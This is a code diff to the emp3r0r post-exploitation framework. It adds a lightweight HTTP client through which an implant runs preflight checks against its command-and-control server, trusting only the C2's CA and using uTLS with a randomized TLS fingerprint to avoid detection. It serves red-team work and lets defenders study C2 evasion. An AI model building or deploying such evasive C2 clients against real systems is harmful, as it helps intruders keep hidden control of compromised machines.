@@ -4,6 +4,7 @@ import (
 	"net/http"
 	"net/url"
 	"strings"
+	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -79,4 +80,48 @@ init_transport:
 
 	logging.Printf("Transport initialized (%s)", c2url)
 	return &http.Client{Transport: tr}
+}
+
+// CreatePreflightHTTPClient creates a lightweight HTTP client for preflight checks
+// Only adds C2's CA cert and uses utls with random JA3 fingerprint
+// This is suitable for preflight checks where we want minimal overhead
+func CreatePreflightHTTPClient(c2Addr string) *http.Client {
+	// C2 URL
+	addr := c2Addr
+	if !strings.HasPrefix(addr, "http") {
+		addr = "https://" + addr
+	}
+	c2url, err := url.Parse(addr)
+	if err != nil {
+		logging.Printf("Error parsing C2 address '%s': %v", addr, err)
+		return nil
+	}
+
+	// Create a cert pool with only C2's CA cert
+	rootCAs, err := ExtractCABundle(CACrtPEM)
+	if err != nil {
+		logging.Printf("ExtractCABundle: %v", err)
+		return nil
+	}
+
+	// Trust only C2's CA cert in our TLS client
+	c2Host := c2url.Hostname()
+	config := &utls.Config{
+		ServerName:         c2Host,
+		InsecureSkipVerify: false,
+		RootCAs:            rootCAs,
+	}
+
+	// Use NewUTLSRoundTripper with random ALPN fingerprint for preflight
+	// This avoids the heavy initialization and retry logic in CreateEmp3r0rHTTPClient
+	rt, err := NewUTLSRoundTripper("hellorandomizedalpn", config, nil)
+	if err != nil {
+		logging.Printf("Error creating uTLS round tripper: %v", err)
+		return nil
+	}
+
+	return &http.Client{
+		Transport: rt,
+		Timeout:   30 * time.Second,
+	}
 }
